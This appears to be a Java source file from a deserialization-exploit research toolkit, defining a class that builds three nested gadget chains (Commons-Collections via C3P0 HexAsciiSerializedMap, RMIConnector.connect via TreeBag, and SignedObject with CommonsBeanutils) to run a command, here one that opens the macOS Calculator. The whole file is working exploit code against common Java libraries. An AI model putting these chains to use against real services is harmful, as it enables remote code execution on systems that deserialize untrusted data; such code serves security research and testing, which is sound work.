package xyz.eki.marshalexp.solution;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import xyz.eki.marshalexp.gadget.cb.GCB;
import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.cc.GCC4;
import xyz.eki.marshalexp.gadget.jdk.GRMIConnector;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.poc.CC4;
import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.poc.MCC6;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

public class DualDeserialize {
    public static String cmd = "open /System/Applications/Calculator.app";
    public static void case1() throws Exception{
        Object poc = new MCC6().getPocObject(cmd);
        WrapperConnectionPoolDataSource dataSource = new WrapperConnectionPoolDataSource();
        dataSource.setUserOverridesAsString(String.format("HexAsciiSerializedMap:%s;", MiscUtils.bytes2HexString(SerializeUtils.serialize(poc))));
    }

    public static void case2() throws Exception{
        Object poc = new CC4().getPocObject(cmd);
        Object rmiConnector = GRMIConnector.invokeConnect2Deserialize(poc);
        //Object exp = GCC.deserialize2MethodInvoke(rmiConnector, "connect");
        //Object exp = GCC4.deserialize2MethodInvoke(rmiConnector,"connect");
        Object exp = GCC4.deserializeTreeBag2MethodInvoke(rmiConnector,"connect");
        SerializeUtils.deserialize(SerializeUtils.serialize(exp));
    }

    public static void case3() throws Exception{
        Object poc = new CC6().getPocObject(cmd);
//        Object rome = GRome.toString2Getter(GSignedObject.getter2Deserialize(poc));
//        Object exp  = GHashMap.deserialize2HashCode(rome,rome);
        Object exp = GCB.deserialize2Getter(GSignedObject.getter2Deserialize(poc),"object");
        SerializeUtils.deserialize(SerializeUtils.serialize(exp));
    }

    public static void main(String[] args)  throws Exception{
        case3();
    }
}
